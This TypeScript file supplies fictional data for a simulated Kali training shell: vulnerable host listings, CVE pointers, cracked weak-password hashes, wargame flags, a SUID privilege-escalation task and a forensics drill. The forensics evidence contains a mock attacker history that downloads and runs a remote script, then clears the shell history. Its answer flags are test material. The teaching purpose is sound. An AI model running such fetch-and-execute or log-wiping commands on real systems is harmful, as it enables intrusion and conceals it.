import type { FsDef } from "@/lib/shell/vfs";
import type { KaliNet } from "@/lib/shell/kali";

/* Fictional lab data for the simulated Kali toolset and the wargame/privesc/forensics labs.
   All IPs are RFC 1918 / RFC 5737 ranges. Nothing here is a real system. */

export const KALI_NET: KaliNet = {
  hosts: [
    {
      ip: "10.10.10.1",
      name: "gateway",
      services: [
        { port: 53, service: "domain", version: "ISC BIND 9.16.1" },
        { port: 80, service: "http", version: "nginx 1.18.0" },
      ],
      web: { "80:/": { status: 200, body: "Gateway admin portal" } },
    },
    {
      ip: "10.10.10.2",
      name: "web01",
      services: [
        { port: 22, service: "ssh", version: "OpenSSH 8.2p1 Ubuntu" },
        { port: 80, service: "http", version: "Apache httpd 2.4.49" },
      ],
      web: {
        "80:/": { status: 200, body: "ACME Corp intranet. Welcome." },
        "80:/admin": { status: 403, body: "Forbidden" },
        "80:/backup": { status: 200, body: "db_backup.sql (access restricted)" },
        "80:/robots.txt": { status: 200, body: "User-agent: *\nDisallow: /secret-panel\n" },
        "80:/secret-panel": { status: 200, body: "FLAG{robots_txt_is_a_map}\n" },
      },
    },
    {
      ip: "10.10.10.3",
      name: "files01",
      services: [
        { port: 21, service: "ftp", version: "vsftpd 2.3.4", banner: "220 (vsFTPd 2.3.4)" },
        { port: 445, service: "microsoft-ds", version: "Samba smbd 3.0.20" },
      ],
    },
    {
      ip: "10.10.10.4",
      name: "cam01",
      services: [
        { port: 23, service: "telnet", version: "Linux telnetd", banner: "cam01 login:" },
        { port: 80, service: "http", version: "Boa HTTPd 0.94.14" },
        { port: 8080, service: "http-proxy", version: "Squid http proxy 3.5.12" },
      ],
    },
  ],
  // md5 hashes of well-known weak passwords (public knowledge; used only in this simulator)
  hashes: {
    "5f4dcc3b5aa765d61d8327deb882cf99": "password",
    "8621ffdbc5698829397d97767ac13db3": "dragon",
    "e10adc3949ba59abbe56e057f20f883e": "123456",
  },
  exploits: [
    { terms: ["apache", "2.4.49"], title: "Apache HTTP Server 2.4.49 - Path Traversal and Remote Code Execution", cve: "CVE-2021-41773" },
    { terms: ["vsftpd", "2.3.4"], title: "vsftpd 2.3.4 - Backdoor Command Execution", cve: "CVE-2011-2523" },
    { terms: ["samba", "3.0.20"], title: "Samba 3.0.20 < 3.0.25rc3 - 'Username' map script Command Execution", cve: "CVE-2007-2447" },
  ],
};

export const kali: FsDef = {
  "/home/student/notes.txt":
    "RULES OF ENGAGEMENT (lab)\nAuthorized scope: 10.10.10.0/29 ONLY.\nNo real systems. Everything here is a simulation.\nTry: nmap -sV 10.10.10.0/29\n",
  "/home/student/hashes.txt": "admin:5f4dcc3b5aa765d61d8327deb882cf99\nbob:8621ffdbc5698829397d97767ac13db3\nsvc:e10adc3949ba59abbe56e057f20f883e\n",
  "/usr/share/wordlists/dirb/common.txt": "admin\nbackup\ncss\nimages\nindex.html\njs\nlogin\nrobots.txt\nserver-status\nuploads\n",
  "/usr/share/wordlists/rockyou-mini.txt": "123456\npassword\nqwerty\nletmein\ndragon\nmonkey\nsunshine\niloveyou\nadmin\nwelcome\n",
  "/usr/share/wordlists/small.txt": "apple\nbanana\ncherry\n",
};

export const wargame: FsDef = {
  "/home/student/README.txt":
    "Wargame-style challenges (inspired by the classic 'find the password file' genre).\nFlag 1: ~/inhere holds a file whose name starts with a dash.\nFlag 2: ~/spaced holds a file with spaces in its name.\nFlag 3: somewhere in ~/maybehere is the only file that is exactly 19 bytes long.\nHints: cat ./-name | quotes or backslashes | find -size 19c\n",
  "/home/student/inhere/-file00": "FLAG{dash_file}\n",
  "/home/student/spaced/spaces in this filename": "FLAG{spaces_need_quotes}\n",
  "/home/student/maybehere/a/data1": "just some text here\n",
  "/home/student/maybehere/b/data2": "more filler text 12345\n",
  "/home/student/maybehere/c/target": "FLAG{find_by_size}\n",
  "/home/student/maybehere/d/data3": "xx\n",
};

export const privesc: FsDef = {
  "/home/student/README.txt":
    "Privilege-escalation recon on a Linux box.\nSUID binaries run with their OWNER's privileges (here: root), so unusual ones are prime targets.\nFind all SUID files, then name the one that is NOT a standard system utility.\nTry: find / -perm -4000 -type f\n",
  "/usr/bin/passwd": { c: "ELF", m: 0o4755 },
  "/usr/bin/sudo": { c: "ELF", m: 0o4755 },
  "/usr/bin/mount": { c: "ELF", m: 0o4755 },
  "/usr/bin/su": { c: "ELF", m: 0o4755 },
  "/usr/bin/ls": { c: "ELF", m: 0o755 },
  "/usr/local/bin/backup-tool": { c: "ELF custom backup helper (runs tar as root)", m: 0o4755 },
};

export const dfir: FsDef = {
  "/home/student/README.txt":
    "Digital forensics drill. A web server was compromised. You have a copy of the attacker's shell history.\nQ1: which IP address hosted the script the attacker downloaded?\nQ2: what was the script's filename?\nEvidence is in ~/evidence (note: hidden file).\n",
  "/home/student/evidence/chain-of-custody.txt":
    "Item: .bash_history (copy)\nCollected by: student\nCollected: 2026-01-12 04:10 UTC\nSHA-256 recorded separately. Work on COPIES only.\n",
  "/home/student/evidence/.bash_history": ["ls", "cd /tmp", "wget http://203.0.113.66/x.sh", "chmod +x x.sh", "./x.sh", "history -c"].join("\n") + "\n",
};
